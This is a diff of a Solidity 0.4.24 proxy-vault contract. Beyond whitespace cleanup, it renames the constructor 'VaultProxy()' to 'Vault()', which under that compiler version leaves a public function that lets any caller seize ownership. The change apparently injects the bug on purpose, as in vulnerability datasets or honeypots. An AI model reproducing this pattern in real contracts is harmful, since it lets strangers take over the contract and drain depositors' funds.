@@ -1,14 +1,15 @@
 pragma solidity ^0.4.24;
 
-contract Proxy  {
-    modifier onlyOwner { 
-        require(msg.sender == Owner); 
-        _; 
-    } 
+contract Proxy {
+    modifier onlyOwner {
+        require(msg.sender == Owner);
+        _;
+    }
+
     address public Owner = msg.sender;
 
-    function transferOwner(address _owner) public onlyOwner { 
-        Owner = _owner; 
+    function transferOwner(address _owner) public onlyOwner {
+        Owner = _owner;
     }
 
     function proxy(address target, bytes data) public payable {
@@ -21,7 +22,7 @@ contract VaultProxy is Proxy {
 
     function () public payable { }
 
-    function VaultProxy() public payable {
+    function Vault() public payable {
         if (msg.sender == tx.origin) {
             Owner = msg.sender;
             deposit();
